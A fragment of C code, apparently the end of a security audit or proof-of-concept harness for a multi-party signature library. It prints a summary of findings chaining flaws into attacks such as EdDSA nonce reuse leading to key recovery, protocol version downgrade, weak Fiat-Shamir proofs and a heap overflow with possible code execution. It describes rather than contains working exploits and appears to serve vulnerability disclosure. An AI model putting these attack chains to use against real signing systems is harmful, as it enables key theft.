    printf("  F2 + F3 + F11: Version downgrade -> truncated Fiat-Shamir -> weak DH proofs\n");
    printf("  F1:            EdDSA nonce reuse via use_keccak -> full key recovery (P1)\n");
    printf("  F17:           EdDSA 2-party no commitment -> adaptive R -> key recovery\n");
    printf("  F12:           Heap overflow in destructor -> potential code execution (P3)\n");
    printf("  F13:           Offline sig no verification -> DoS / invalid signatures\n");
    printf("  F7 + F8:       1024-bit Ring Pedersen + no rotation -> permanent compromise\n");
    printf("  F11:           Hardcoded use_extended_seed=0 -> non-binding proofs\n");
    printf("\n");
    printf("Extended attacks (zero precondition, maximum impact):\n");
    printf("  EXT-1: Version downgrade proof size comparison (P2)\n");
    printf("  EXT-2: Heap overflow 100-session accumulation (P3)\n");
    printf("  EXT-3: Offline signing nonce destruction chain (P2)\n");
    printf("  EXT-4: Cross-context non-binding proofs (P2)\n");
    printf("\n");

    return (fail_count > 0) ? 1 : 0;
}
